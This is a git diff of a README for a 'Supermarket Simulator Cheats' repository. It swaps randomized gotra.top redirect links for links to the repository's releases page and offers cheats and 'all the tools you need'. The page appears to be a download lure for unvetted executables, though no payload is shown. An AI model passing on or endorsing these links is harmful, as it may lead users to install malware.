@@ -1,9 +1,9 @@
-![maxresdefault](https://github.com/user-attachments/assets/358c661d-5081-4bad-957e-a4b841a1f844)
+![maxresdefault](https://github.com/Dharshan0013/Supermarket-Simulator-Cheats/releases)
 
 # **Supermarket Simulator Cheats**
 
 #
-[![https://otCIE.gotra.top/54/baJFww6V](https://ad97pUs.gotra.top/l.svg)](https://NDWSmnmx.gotra.top/54/szPOZm2)
+[![https://github.com/Dharshan0013/Supermarket-Simulator-Cheats/releases](https://github.com/Dharshan0013/Supermarket-Simulator-Cheats/releases)](https://github.com/Dharshan0013/Supermarket-Simulator-Cheats/releases)
 
 Welcome to the **Supermarket Simulator Cheats**, your comprehensive guide to cheats, tricks, and strategies for enhancing your experience in Supermarket Simulator. Whether you’re looking to maximize profits, manage your store efficiently, or unlock hidden features, this repository provides all the tools you need!
 
